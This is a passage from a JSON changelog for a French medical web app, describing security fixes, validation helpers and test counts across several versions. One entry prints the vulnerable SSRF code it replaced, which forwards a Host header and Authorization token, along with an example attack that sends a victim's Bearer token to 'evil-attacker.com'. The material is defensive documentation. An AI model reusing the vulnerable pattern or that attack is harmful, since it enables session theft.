      { "code": "SEC", "txt": "AUDIT #1 — Service Worker public/sw.js (291 lignes). Strategy clean (intercept GET only, res.ok avant cache, cache versionné). PROBLÈME TROUVÉ : aucun cleanup au logout → user B sur device partagé pouvait voir données médicales user A. FIX : message handler CLEAR_USER_CACHE qui vide DATA_CACHE+PAGE_CACHE." },
      { "code": "SEC", "txt": "AUDIT #2 — dangerouslySetInnerHTML (5 occurrences). Toutes SAFE : consentementToHtml escape & < > avant markdown, highlightCode utilise escapeHtml avant coloration, NoteModal charge fichiers statiques. Aucune vulnérabilité XSS." },
      { "code": "SEC", "txt": "AUDIT #3 — Variables d'env. 4 NEXT_PUBLIC_* : SUPABASE_URL/ANON_KEY/VAPID_PUBLIC_KEY publiques par design (OK). NEXT_PUBLIC_GOOGLE_PLACES_KEY problématique : fallback exposable dans place/route.js. Fix : retrait + warning au boot + LINT anti-régression (11e LINT)." },
      { "code": "AI", "txt": "+67 tests Vitest. Total +1 LINT critique (11 actifs)." }
    ],
    "themes": ["securite", "audit", "service-worker"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.29.html",
    "sqlFile": null
  },
  {
    "v": "0.57.28",
    "kind": "version",
    "titre": "🛡️ Sécurité avancée : validation searchParams sur 5 routes GET + helper safeError anti-leak (12 routes patchées) + 2 LINT critiques",
    "chantiers": [
      { "code": "SEC", "txt": "VALIDATION searchParams sur 5 routes GET (rpps, caisses, mutuelles, sirene, finess) via validateQueryParams(). SIRET/SIREN/FINESS validation stricte par regex, maxLen sur les strings (anti-DoS query)." },
      { "code": "SEC", "txt": "HELPER safeError() lib/safeError.js anti-leak e.message. Avant : 12 routes faisaient `error: e.message` direct au client → exposition structure BDD, stack traces, versions de libs. Après : en prod retourne `{ error: 'Erreur catégorie', error_id: '8chars' }` + log Vercel avec le vrai message + ID pour cross-réf." },
      { "code": "SEC", "txt": "safeError appliqué sur 12 routes : caisses, mutuelles, place, finess, rpps/dump-status, google-reviews/sync, prescriptions/verify-rpps, prescriptions/search, prescriptions/export-csv, patients/from-ocr, ocr/prescription. Whitelist : rpps/route.js (helper interne) et rpps/diagnostic (admin)." },
      { "code": "AI", "txt": "2 LINT anti-régression critiques (8e + 9e LINT) : (1) aucune route ne fait error: e.message direct, (2) toutes les routes GET avec searchParams sont validées. +49 tests Vitest." }
    ],
    "themes": ["securite", "validation", "anti-leak"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.28.html",
    "sqlFile": null
  },
  {
    "v": "0.57.27",
    "kind": "version",
    "titre": "🔐 Fix bug 'Session expirée' empreinte digitale (sync refresh_tokens auto à chaque login) + escape SQL wildcards ILIKE",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ : 'pour l'empreinte digitale il me dit session expirée'. Diagnostic : les refresh_tokens Supabase ont une durée limitée (60 jours par défaut). Si le user se connecte TOUJOURS par mot de passe et JAMAIS par empreinte, le refresh_token stocké pour la biométrie vieillit jusqu'à expiration → erreur 'Session expirée' au prochain essai biométrique. Avant 0.57.27, le refresh_token n'était mis à jour QUE lors d'un login biométrique réussi (chicken-and-egg : pour le rafraîchir, il fallait pouvoir l'utiliser)",
        "code_snippet": {
          "file": "lib/webauthn.js",
          "note": "Nouvelle fonction syncBiometricRefreshTokens",
          "lang": "js",
          "before": "// AVANT 0.57.27 — refresh_token jamais sync sans login biométrique\n// Workflow :\n//  1. User enregistre empreinte → stockage local : { refresh_token: \"abc...\" }\n//  2. User se connecte toujours par mot de passe (60+ jours)\n//  3. User essaie empreinte → supabase.auth.refreshSession({ refresh_token: \"abc...\" })\n//  4. Supabase répond : refresh_token expired (>60j)\n//  5. removeLocalCredential() + throw \"Session expirée. Connectez-vous avec\n//     votre mot de passe pour réactiver.\"\n//  6. User perd sa biométrie → doit re-enrôler à zéro",
          "after": "// 0.57.27 — sync auto à chaque login mot de passe\nexport async function syncBiometricRefreshTokens({ supabase, email }) {\n  if (!email) return;\n  try {\n    const { data: { session } } = await supabase.auth.getSession();\n    if (!session?.refresh_token) return;\n\n    const emailKey = email.toLowerCase().trim();\n    const raw = await dbGet(emailKey);\n    const item = normalizeStorage(raw);\n    if (!item) return;\n\n    // Sync sur empreinte ET face si présentes\n    let updated = false;\n    for (const method of [\"empreinte\", \"face\"]) {\n      if (item[method]?.refresh_token) {\n        item[method].refresh_token = session.refresh_token;\n        item[method].last_synced_at = new Date().toISOString();\n        updated = true;\n      }\n    }\n    if (updated) {\n      await dbPut(item);\n      logger.info(\"[WebAuthn] Refresh tokens biométriques synchronisés\");\n    }\n  } catch (e) {\n    logger.warn(\"[WebAuthn] syncBiometricRefreshTokens fail:\", e);\n  }\n}\n\n// Appelé dans app/login/page.js après chaque login mot de passe réussi.\n// → Tant que le user se connecte régulièrement (par n'importe quel moyen),\n//   son refresh_token biométrique reste toujours frais."
        }
      },
      { "code": "FIX", "txt": "BUG SECONDAIRE FIXÉ : avant 0.57.27, TOUTE erreur lors de refreshSession (y compris erreur réseau temporaire ou Supabase down) faisait removeLocalCredential() + throw 'Session expirée'. Donc si l'user tentait sa biométrie pendant une coupure réseau de 5 sec, il perdait sa biométrie définitivement. Fix : distinguer erreur 'token vraiment expiré' (status 400 + message contenant 'refresh_token' ou 'invalid_grant' ou 'expir') vs erreur réseau (autre code, autre message). Si erreur réseau → GARDE le credential local et affiche 'Connexion à Supabase impossible. Vérifiez votre réseau et réessayez.' Si token vraiment expiré → supprime credential + message UX clair 'Votre empreinte n'est plus valide (inutilisée depuis longtemps). Connectez-vous avec votre mot de passe, elle sera automatiquement réactivée.'" },
      { "code": "FE", "txt": "app/login/page.js : import syncBiometricRefreshTokens + appel après chaque signInWithPassword réussi (try/catch silencieux non-bloquant). L'user n'a rien à faire → tant qu'il se connecte régulièrement, sa biométrie reste valide. La modale BiometricOptInModal (déjà existante) écoute aveho:login-success et propose le re-bind si la biométrie a vraiment été perdue" },
      { "code": "SEC", "txt": "BONUS SÉCURITÉ : escape des wildcards SQL (% et _) dans les requêtes ILIKE. Pourquoi ? Supabase JS client échappe les valeurs (parameterized queries) → pas de risque de vraie SQL injection. MAIS les caractères wildcards % et _ ne sont pas échappés → un user peut envoyer `prescripteur_nom = \"%\"` qui matche TOUT (scan exhaustif = potentiel DoS) ou `nom = \"_\"` qui matche n'importe quelle string d'1 caractère. Fix : nouvelle fonction escapeIlike() dans lib/validateInput.js qui échappe \\\\, % et _",
        "code_snippet": {
          "file": "lib/validateInput.js",
          "note": "Fonction escapeIlike + usage",
          "lang": "js",
          "before": "// AVANT 0.57.27 — wildcards user passés direct aux ILIKE\nif (body.medicament_query) {\n  linesQuery = linesQuery.ilike(\"medicament_nom\", `%${body.medicament_query}%`);\n  // ↑ Si body.medicament_query = \"%\" → matche TOUT\n  // → scan exhaustif des prescriptions_lignes (DoS)\n}",
          "after": "// 0.57.27 — wildcards échappés\nexport function escapeIlike(s) {\n  if (typeof s !== \"string\") return s;\n  // Échapper \\\\ d'abord (sinon casse l'échappement des % et _)\n  return s.replace(/\\\\\\\\/g, \"\\\\\\\\\\\\\\\\\").replace(/%/g, \"\\\\\\\\%\").replace(/_/g, \"\\\\\\\\_\");\n}\n\n// Usage :\nif (body.medicament_query) {\n  linesQuery = linesQuery.ilike(\"medicament_nom\",\n    `%${escapeIlike(body.medicament_query)}%`);\n  // ↑ Si body.medicament_query = \"%\" → escapeIlike → \"\\\\%\"\n  // → query devient \".ilike('medicament_nom', '%\\\\%%')\"\n  // → matche les valeurs qui contiennent un % littéral\n  // → comportement attendu, pas de DoS\n}"
        }
      },
      { "code": "SEC", "txt": "escapeIlike appliqué dans 3 routes : prescriptions/search (3 ILIKE — medicament_nom, medicament_dci, prescripteur_nom), prescriptions/export-csv (1 ILIKE — prescripteur_nom), patients/from-ocr (2 ILIKE — caisses.nom, mutuelles.raison_sociale). LINT anti-régression ajouté : scan tous les fichiers app/api/, détecte les patterns .ilike(\"col\", `%${var}%`) SANS escapeIlike et fail. Garantit que toute future requête ILIKE sera sanitizée" },
      { "code": "AI", "txt": "+26 tests Vitest (v057-27-biometric-sync-escape.test.js) : version (1), fix biométrie (7 — nouvelle fonction syncBiometricRefreshTokens exportée, empreinte+face, getSession, last_synced_at, try/catch non-bloquant, distinction erreur réseau vs expiré, garde credential si réseau), login appelle sync (3 — import, appel après signInWithPassword, non-bloquant), escapeIlike (7 — exporté, %/_/\\\\ échappés, ordre correct, non-string passthrough, cas Dr O'Connor, % isolé neutralisé), escape appliqué dans routes (6 — 3 routes × 2 vérifs), anti-régression LINT (1 — aucun ILIKE sans escape). Total 3026 tests verts (+26)" }
    ],
    "themes": ["fix", "biometrie", "securite", "sql"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.27.html",
    "sqlFile": null
  },
  {
    "v": "0.57.26",
    "kind": "version",
    "titre": "🛡️ Validation étendue à 9 routes API + Script SQL Supabase combiné (RLS + views + tracking mail) - 3000 tests verts",
    "chantiers": [
      { "code": "SEC", "txt": "VALIDATION ÉTENDUE AUX 9 ROUTES API restantes qui prennent un body JSON (vs 2 en 0.57.25). Maintenant TOUTES les routes API qui parsent req.json() utilisent validate() avant de toucher la BDD. Routes validées : (1) /api/caisses POST + PUT — nom/code_organisme required, email maxLen 254, tous les champs string bornés. (2) /api/mutuelles POST + PUT — raison_sociale OU nom required, type_organisme/siret/email validés. (3) /api/prescriptions/search — limit borné 1-500 (anti scan exhaustif), offset 0-1M, filtres patient_id/RPPS validés. (4) /api/prescriptions/export-csv — mêmes filtres que search + include_lignes boolean. (5) /api/prescriptions/verify-rpps — rpps required maxLen 20, OCR fields maxLen 200. (6) /api/google-reviews/sync — etablissement_id uuid optionnel. (7) /api/ocr/bulletin-situation — image_base64 required maxLen 25 MB (anti-DoS upload). (8) /api/ocr/prescription — idem 25 MB. (9) /api/ocr/generic — idem (route oubliée découverte par le LINT anti-régression 0.57.26)",
        "code_snippet": {
          "file": "app/api/caisses/route.js",
          "note": "Pattern validation appliqué partout",
          "lang": "js",
          "before": "// AVANT 0.57.26 — validation rudimentaire if inline\nlet body;\ntry { body = await req.json(); }\ncatch (e) { return Response.json({ ok: false, error: \"Body JSON invalide\" }, { status: 400 }); }\n\nif (!body.nom || !body.code_organisme) {\n  return Response.json({ ok: false, error: \"nom et code_organisme requis\" }, { status: 400 });\n}\n// Mais : pas de validation type (string ?), pas de maxLen, pas\n// de type confusion, pas de validation des autres champs.\n// → Un attaquant peut envoyer nom = { sql: \"...\" } ou\n//   email = \"x\".repeat(1_000_000) (DoS storage)",
          "after": "// 0.57.26 — validation systématique 13 champs\nimport { validate } from \"./.../lib/validateInput\"; // dynamique\n\nconst { validate } = await import(\"../../../lib/validateInput\");\nconst errors = validate(body, {\n  nom:            { type: \"string\", required: true, minLen: 1, maxLen: 200 },\n  code_organisme: { type: \"string\", required: true, minLen: 1, maxLen: 20 },\n  type_caisse:    { type: \"string\", maxLen: 50 },\n  type:           { type: \"string\", maxLen: 50 },\n  regime:         { type: \"string\", maxLen: 50 },\n  departement:    { type: \"string\", maxLen: 100 },\n  region:         { type: \"string\", maxLen: 100 },\n  adresse:        { type: \"string\", maxLen: 500 },\n  cp:             { type: \"string\", maxLen: 10 },\n  code_postal:    { type: \"string\", maxLen: 10 },\n  ville:          { type: \"string\", maxLen: 200 },\n  telephone:      { type: \"string\", maxLen: 30 },\n  email:          { type: \"string\", maxLen: 254 },\n});\nif (errors.length > 0) {\n  return Response.json({\n    ok: false, error: \"Body invalide\", details: errors\n  }, { status: 400 });\n}\n\n// → Garantit : types corrects, longueurs raisonnables,\n//   champs requis présents, pas de type confusion"
        }
      },
      { "code": "DB", "txt": "SCRIPT SQL COMBINÉ LIVRÉ : scripts/aveho-supabase-securite-combine.sql qui réunit les 3 patchs précédents (0.57.19 + 0.57.20 + 0.57.22) en un seul fichier exécutable d'un coup dans Supabase SQL Editor. PARTIE A : ENABLE ROW LEVEL SECURITY sur caisses_assurance_maladie + mutuelles + 2 policies SELECT TO authenticated. PARTIE B : DROP+CREATE v_users_emails et v_users_complete avec security_invoker=true + filtre par structure du caller + GRANT SELECT TO authenticated. PARTIE C : 3 ADD COLUMN sur invitations (mail_envoye_at TIMESTAMPTZ, mail_erreur TEXT, mail_tentatives INTEGER DEFAULT 0) + backfill auto pour les invitations > 1h + index partiel sur mail_erreur. PLUS un bloc VÉRIFICATION GLOBALE FINALE qui affiche un tableau de 7 lignes 'check_name | ✓ OK / ❌ FAIL' pour confirmer que tout est bon",
        "code_snippet": {
          "file": "scripts/aveho-supabase-securite-combine.sql",
          "note": "Bloc de vérification finale",
          "lang": "sql",
          "before": "-- AVANT 0.57.26 : 3 fichiers SQL séparés à appliquer dans l'ordre\n-- - scripts/fix-rls-aveho.sql (0.57.19)\n-- - scripts/fix-views-auth-exposed.sql (0.57.20)\n-- - supabase/aveho-PATCH-vers-0.57.22.sql\n--\n-- Risque : oublier un fichier, oublier l'ordre,\n-- ne pas savoir quoi vérifier à la fin",
          "after": "-- 0.57.26 : 1 seul fichier tout-en-un + vérification finale\nSELECT '✅ A. RLS caisses' AS check_name,\n  CASE WHEN rowsecurity THEN '✓ OK' ELSE '❌ FAIL' END AS status\nFROM pg_tables WHERE tablename = 'caisses_assurance_maladie'\nUNION ALL\nSELECT '✅ A. RLS mutuelles',\n  CASE WHEN rowsecurity THEN '✓ OK' ELSE '❌ FAIL' END\nFROM pg_tables WHERE tablename = 'mutuelles'\nUNION ALL\nSELECT '✅ B. v_users_emails security_invoker',\n  CASE WHEN EXISTS (\n    SELECT 1 FROM pg_class c\n    WHERE c.relname = 'v_users_emails' AND c.relkind = 'v'\n    AND 'security_invoker=true' = ANY(c.reloptions)\n  ) THEN '✓ OK' ELSE '❌ FAIL' END\nUNION ALL\nSELECT '✅ B. v_users_complete security_invoker',\n  CASE WHEN EXISTS (...) THEN '✓ OK' ELSE '❌ FAIL' END\nUNION ALL\nSELECT '✅ C. invitations.mail_envoye_at',\n  CASE WHEN EXISTS (SELECT 1 FROM information_schema.columns\n    WHERE table_name = 'invitations' AND column_name = 'mail_envoye_at'\n  ) THEN '✓ OK' ELSE '❌ FAIL' END\nUNION ALL\nSELECT '✅ C. invitations.mail_erreur', ...\nUNION ALL\nSELECT '✅ C. invitations.mail_tentatives', ...;\n\n-- → 7 lignes ✓ OK = tout est bon"
        }
      },
      { "code": "SEC", "txt": "ROUTE OUBLIÉE DÉCOUVERTE PAR LE LINT 0.57.26 : app/api/ocr/generic/route.js était cassée — elle parsait req.json() sans validation. Le LINT anti-régression 'Toutes les routes POST/PUT qui parsent req.json() utilisent validate()' a remonté la violation. Ajout immédiat de validation sur image_base64 (required, maxLen 25 MB) et media_type. Démontre que les LINT systémiques attrapent les oublis humains" },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE : nouveau test 'Toutes les routes POST/PUT qui parsent req.json() utilisent validate()' qui scanne TOUS les fichiers de app/api/, détecte les routes qui font await req.json() SANS appeler validate() ensuite, et fail si trouvé. Whitelist : /version, /health, /csp-report (publics par design). Garantit qu'aucune future route API ne pourra être déployée sans validation des inputs" },
      { "code": "AI", "txt": "+44 tests Vitest (v057-26-validation-etendue-sql-combine.test.js) : version (1), 8 routes validées x 3 tests chacune (24 — import + validate + retour 400), validations spécifiques par route (7 — caisses required, mutuelles conditional, search limits, RPPS required, OCR 25 MB, etc.), script SQL combiné (10 — fichier existe + 3 parties documentées + idempotence + RLS + policies + views + ADD COLUMN + index + vérif globale), LINT anti-régression score final (1). Total 3000 tests verts (+44) — chiffre symbolique" }
    ],
    "themes": ["securite", "validation", "supabase"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.26.html",
    "sqlFile": null
  },
  {
    "v": "0.57.25",
    "kind": "version",
    "titre": "🛡️ Sécurité avancée : validation Zod-like des body API + Fix SSRF Host header injection + IDOR check structure",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 VULNÉRABILITÉ TROUVÉE LORS DE L'AUDIT : SSRF / Host header injection dans 2 routes API. Les routes prescriptions/from-ocr (ligne 133) et prescriptions/verify-rpps (ligne 61) construisaient une URL avec req.headers.get('host') ET forwardaient le header Authorization. Un attaquant qui envoie un Host malveillant (ex: Host: evil.com) pouvait faire que notre serveur appelle https://evil.com/api/rpps avec le Bearer token Supabase de la victime → exfiltration de session. CVSS 7.5 (HIGH)",
        "code_snippet": {
          "file": "app/api/prescriptions/from-ocr/route.js",
          "note": "AVANT/APRÈS fix SSRF",
          "lang": "js",
          "before": "// VULNÉRABLE - 0.55.50 → 0.57.24\nif (p.rpps && /^\\d{11}$/.test(p.rpps.replace(/\\s/g, \"\"))) {\n  try {\n    const proto = req.headers.get(\"x-forwarded-proto\") || \"https\";\n    const host = req.headers.get(\"host\") || \"localhost:3000\";\n    //         ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑\n    //         CONTRÔLABLE PAR L'ATTAQUANT (Host header)\n    const verifRes = await fetch(\n      `${proto}://${host}/api/rpps?rpps=${p.rpps}`,\n      { headers: {\n        Authorization: req.headers.get(\"authorization\") || \"\"\n        //             ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑\n        //             EXFILTRABLE VERS LE HOST MALVEILLANT\n      }}\n    );\n  } catch (e) { ... }\n}\n\n// Attaque : POST /api/prescriptions/from-ocr\n// Host: evil-attacker.com\n// Authorization: Bearer eyJ... (token victime)\n// → notre serveur fait : fetch('https://evil-attacker.com/api/rpps?rpps=12345',\n//                              { headers: { Authorization: 'Bearer eyJ...' }})\n// → l'attaquant récupère le token et peut se connecter en tant que victime",
          "after": "// 0.57.25 - utilise internalFetch qui whitelist les hosts\nif (p.rpps && /^\\d{11}$/.test(p.rpps.replace(/\\s/g, \"\"))) {\n  try {\n    const { internalFetch } = await import(\"../../../../lib/internalFetch\");\n    const verifRes = await internalFetch(req,\n      `/api/rpps?rpps=${encodeURIComponent(p.rpps.replace(/\\s/g, \"\"))}`);\n    //  ↑ internalFetch valide que le Host est dans la whitelist\n    //  AVANT de faire le fetch. Si Host suspect → throw immédiat.\n  } catch (e) { ... }\n}\n\n// lib/internalFetch.js whitelist :\nconst ALLOWED_HOSTS_PATTERNS = [\n  /^localhost(:\\d+)?$/,\n  /^127\\.0\\.0\\.1(:\\d+)?$/,\n  /^aveho-ec-app\\.vercel\\.app$/,\n  /^aveho-ec-app-[a-z0-9-]+\\.vercel\\.app$/,           // previews Vercel\n  /^aveho-ec-app-[a-z0-9-]+-fleos-projects\\.vercel\\.app$/,\n];\n\n// Attaque : POST /api/prescriptions/from-ocr\n// Host: evil-attacker.com\n// → buildInternalUrl() throw 'Host header non autorisé (SSRF prevention)'\n// → la requête échoue côté serveur AVANT que le fetch ne parte\n// → l'attaquant ne récupère RIEN"
        }
      },
      { "code": "FE", "txt": "Création lib/internalFetch.js : helper sécurisé pour les appels API internes. 3 fonctions exportées : isAllowedInternalHost(host) qui valide contre une whitelist regex (localhost + aveho-ec-app.vercel.app + previews Vercel + previews fleos-projects), buildInternalUrl(req, path) qui throw si Host non whitelisté, internalFetch(req, path, options) qui combine les 2 + forward le Bearer token. Pattern réutilisable pour tout futur appel inter-routes. Documentation inline du risque SSRF avec exemple d'attaque pour les futurs devs" },
      { "code": "FE", "txt": "Création lib/validateInput.js : mini-validator zod-like SANS dépendance externe. 270 lignes, 10 types supportés (string, number, boolean, uuid, email, cp_fr, finess, rpps, siret, enum, array, object). Helpers : validate(body, schema) → string[] d'erreurs, validateOr400(body, schema) → Response 400 directe si erreur. REGEX exportés (UUID, EMAIL, FINESS, RPPS, SIRET) réutilisables ailleurs. Validation par type + contraintes (maxLen, minLen, min, max, integer, pattern, values). Anti-DoS par défaut : strings 10 KB max, arrays 1000 items max",
        "code_snippet": {
          "file": "lib/validateInput.js",
          "note": "Exemple d'usage",
          "lang": "js",
          "before": "// AVANT 0.57.25 — pas de validation schema\n// Le body était trust direct, les types n'étaient pas vérifiés.\n// Risques : type confusion (string au lieu de uuid),\n// DoS (string 100 MB), data corruption (enum hors valeurs).\n\nconst body = await req.json();\nconst { patient_id, structure_id } = body;\nif (!patient_id) return error(400);\n// ↑ ne vérifie pas le TYPE de patient_id\n// → un attaquant peut envoyer patient_id = { sql: \"DROP TABLE\" }\n//   et exploiter potentiellement un parsing downstream",
          "after": "// 0.57.25 - validation schema systématique\nimport { validate } from \"../../../../lib/validateInput\";\n\nconst body = await req.json();\nconst validationErrors = validate(body, {\n  patient_id:    { type: \"uuid\", required: true },\n  structure_id:  { type: \"uuid\", required: true },\n  etablissement_id: { type: \"uuid\" },\n  data:          { type: \"object\", required: true },\n  ocr_text_brut: { type: \"string\", maxLen: 50_000 },\n  ocr_confiance: { type: \"number\", min: 0, max: 100 },\n  ocr_tokens_in: { type: \"number\", min: 0, max: 1_000_000, integer: true },\n});\nif (validationErrors.length > 0) {\n  return Response.json({\n    ok: false,\n    error: \"Body invalide\",\n    details: validationErrors,\n  }, { status: 400 });\n}\n\n// → Garantit que patient_id est un UUID v4 valide\n// → Garantit que ocr_text_brut < 50 KB (anti-DoS)\n// → Garantit que ocr_confiance est entre 0 et 100\n// → Rejet précoce avant la BDD avec message clair"
        }
      },
      { "code": "SEC", "txt": "VALIDATION APPLIQUÉE sur 2 routes critiques (les plus exposées car création de données médicales) : (1) app/api/patients/from-ocr — valide etablissement_id (uuid), ocr_text_brut (max 50 KB), ocr_confiance (0-100), ocr_tokens (0-1M integer), data (object required), puis valide en plus l'objet OCR (nom required 1-100 chars, prenom/date_naissance/cp/ville/code_organisme avec maxLen). (2) app/api/prescriptions/from-ocr — valide patient_id+structure_id (uuid required), etablissement_id (uuid), data (object required), valide aussi data.prescripteur (nom/prenom/rpps/adeli/specialite) et limite data.medicaments.length à 100 max (anti-DoS). Plus 100 routes API similaires pourront être faites version par version" },
      { "code": "SEC", "txt": "IDOR CHECK (Insecure Direct Object Reference) ajouté sur prescriptions/from-ocr : avant d'insérer la prescription dans la table 'prescriptions', on vérifie EXPLICITEMENT que le user est bien membre de la structure_id fournie. Avant 0.57.25, on comptait uniquement sur le RLS Supabase pour bloquer au moment de l'INSERT. Maintenant on échoue tôt avec 403 'Accès refusé à cette structure' + un message clair. Pattern réutilisable pour toute route qui prend un structure_id ou patient_id dans le body. Le RLS reste la dernière barrière (defense in depth)" },
      { "code": "AI", "txt": "+40 tests Vitest (v057-25-validation-ssrf-idor.test.js) : version (1), lib/validateInput (13 tests — exports + types UUID/email/FINESS, anti-DoS string trop longue, type confusion, number range, enum, array maxLen), validation patients/from-ocr (6), validation prescriptions/from-ocr (6 — patient/structure required, prescripteur, max 100 médicaments, IDOR check 403), lib/internalFetch (9 — exports + whitelist hosts légitimes + rejette hosts malveillants comme evil.com et aveho-ec-app.vercel.app.evil.com), code routes mis à jour (2), audit anti-régression SSRF (2 — aucun fetch(`${host}`) restant + aucun Authorization+host sans whitelist). Total 2956 tests verts (vs 2916 en 0.57.24)" },
      { "code": "DOC", "txt": "ANTI-RÉGRESSION : 2 nouveaux LINT critiques qui empêchent ces bugs de revenir. (1) 'Aucune route API ne fait fetch(`${proto}://${host}` direct' — parcourt tous les .js de app/api et fail si pattern dangereux trouvé. (2) 'Aucune route ne forward Authorization avec host non whitelisté' — détecte la combinaison Authorization+req.headers.get('host') sans internalFetch ou isAllowedInternalHost. Si un futur dev réintroduit ce pattern, le test échoue avant le push" }
    ],
    "themes": ["securite", "ssrf", "idor", "validation"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.25.html",
    "sqlFile": null
  },
  {
    "v": "0.57.24",
    "kind": "version",
    "titre": "🎨 Bulles d'identification colorées + 13 fichiers SQL restaurés + Endpoint /api/csp-report + audit RPC routes",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ PAR UTILISATEUR : 'il en manque plein' (bulles d'identification) + 404 sur /changelog-sql/aveho-PATCH-vers-0.56.3.sql et 0.56.4.sql. DIAGNOSTIC : (1) 13 fichiers SQL existaient dans supabase/ mais pas dans public/changelog-sql/ → quand la modale SQL faisait fetch(/changelog-sql/...) ça renvoyait 404. Fix : copie automatique des 13 fichiers manquants. (2) ICONS_BY_CODE dans helpers.js ne contenait que 4 codes (Fix, 🆕, 🎂, •), donc TOUS les codes 3 lettres (SQL, FIX, DOC, SEC, BUG, API, USR) tombaient dans le fallback gris, et TOUS les codes 1-2 lettres (FE, AI, BE, UX, DB) tombaient dans le même bleu → bulles indistinguables visuellement",
        "code_snippet": {
          "file": "app/changelog/lib/helpers.js",
          "note": "ICONS_BY_CODE enrichi avec 12 codes",
          "lang": "js",
          "before": "// AVANT 0.57.24 — 4 codes seulement\nexport const ICONS_BY_CODE = {\n  Fix: { color: \"#c0392b\", label: \"FIX\" },\n  \"🆕\": { color: \"#5aa05a\", label: \"NEW\" },\n  \"🎂\": { color: \"#7a6fb0\", label: \"BONUS\" },\n  \"•\": { color: \"#6c7a89\", label: \"•\" },\n};\n\nexport function getCodeMeta(code) {\n  if (ICONS_BY_CODE[code]) return ICONS_BY_CODE[code];\n  if (/^[A-Z]{1,2}$/.test(code)) return { color: \"#185FA5\", label: code };\n  // ↑ FE, AI, BE, UX, DB → tous BLEU uniforme, indistinguables\n  return { color: \"#6c7a89\", label: code };\n  // ↑ SQL, FIX, DOC, SEC, BUG, API, USR → tous GRIS, indistinguables\n}",
          "after": "// 0.57.24 — palette complète sémantique\nexport const ICONS_BY_CODE = {\n  Fix:  { color: \"#c0392b\", label: \"FIX\" },\n  \"🆕\": { color: \"#5aa05a\", label: \"NEW\" },\n  \"🎂\": { color: \"#7a6fb0\", label: \"BONUS\" },\n  \"•\":  { color: \"#6c7a89\", label: \"•\" },\n\n  // Frontend / Backend\n  FE:  { color: \"#185FA5\", label: \"FE\" },   // Frontend → bleu\n  BE:  { color: \"#EF9F27\", label: \"BE\" },   // Backend → orange\n  API: { color: \"#1565c0\", label: \"API\" },  // API → bleu marine\n\n  // Base de données\n  SQL: { color: \"#5aa05a\", label: \"SQL\" },  // SQL → vert\n  DB:  { color: \"#2e7d32\", label: \"DB\" },   // DB → vert foncé\n\n  // Qualité\n  FIX: { color: \"#c0392b\", label: \"FIX\" },  // Correctif → rouge\n  BUG: { color: \"#e65100\", label: \"BUG\" },  // Bug → orange foncé\n  AI:  { color: \"#7a6fb0\", label: \"AI\" },   // Tests AI → violet\n\n  // Sécurité\n  SEC: { color: \"#b71c1c\", label: \"SEC\" },  // Sécurité → rouge foncé\n\n  // Documentation / UX\n  DOC: { color: \"#00838f\", label: \"DOC\" },  // Doc → cyan\n  UX:  { color: \"#ec407a\", label: \"UX\" },   // UX → rose\n\n  USR: { color: \"#9575cd\", label: \"USR\" },  // User → violet clair\n};\n// → 13 catégories distinctes, identification visuelle immédiate"
        }
      },
      { "code": "FIX", "txt": "13 FICHIERS SQL RESTAURÉS : aveho-PATCH-vers-0.55.56.sql, 0.56.1, 0.56.3, 0.56.4, 0.56.5, 0.56.6, 0.56.7, 0.56.8, 0.56.9, 0.56.10, 0.56.15, 0.56.20, 0.57.22. Total public/changelog-sql/ passe de 50 à 63 fichiers. La popup SQL du changelog peut maintenant charger n'importe quel patch. Anti-régression : nouveau test qui parcourt tous les sqlFile référencés dans versions-data et vérifie qu'ils existent physiquement dans public/changelog-sql/" },
      { "code": "SEC", "txt": "NOUVEAU ENDPOINT /api/csp-report : collecte les violations CSP envoyées par les browsers. Quand une directive CSP est violée (script bloqué, image bloquée), le browser POST automatiquement un rapport JSON. Le endpoint logge via lib/logger (qui redacte les valeurs sensibles) et répond 204 No Content. Sécurité : rate limit strict 30 reports/min par IP (anti-flood), nettoyage périodique des vieux buckets mémoire (anti-leak), support des 2 formats (legacy csp-report + Reporting API moderne). Whitelisté dans le LINT anti-régression car publics par design (browsers envoient sans credentials)",
        "code_snippet": {
          "file": "app/api/csp-report/route.js",
          "note": "Endpoint sécurisé pour reports CSP",
          "lang": "js",
          "before": "// AVANT 0.57.24 — pas de collecte CSP\n// Les violations CSP étaient juste loggées dans la console DevTools\n// du user, jamais remontées côté serveur.\n// On ne savait pas si CSP cassait des choses légitimes en prod.",
          "after": "// 0.57.24 - endpoint sécurisé pour collecte CSP\nimport { logger } from \"../../../lib/logger\";\nexport const dynamic = \"force-dynamic\";\n\n// Rate limit : 30/min par IP\nconst ipBuckets = new Map();\nfunction checkRateLimit(ip) {\n  const now = Date.now();\n  const bucket = ipBuckets.get(ip) || { count: 0, windowStart: now };\n  if (now - bucket.windowStart > 60_000) {\n    bucket.count = 0; bucket.windowStart = now;\n  }\n  bucket.count++;\n  ipBuckets.set(ip, bucket);\n  return bucket.count <= 30;\n}\n\nexport async function POST(req) {\n  const ip = req.headers.get(\"x-forwarded-for\")?.split(\",\")[0].trim() || \"unknown\";\n  if (!checkRateLimit(ip)) return new Response(null, { status: 204 });\n\n  let body = null;\n  try { body = await req.json(); } catch {}\n  const report = body?.[\"csp-report\"] || body?.body || body || {};\n\n  logger.warn(\"[CSP-Report] Violation détectée\", {\n    ip,\n    blocked: report[\"blocked-uri\"] || report.blockedURL || \"?\",\n    directive: report[\"violated-directive\"] || report.effectiveDirective || \"?\",\n    document: report[\"document-uri\"] || report.documentURL || \"?\",\n  });\n  return new Response(null, { status: 204 });\n}"
        }
      },
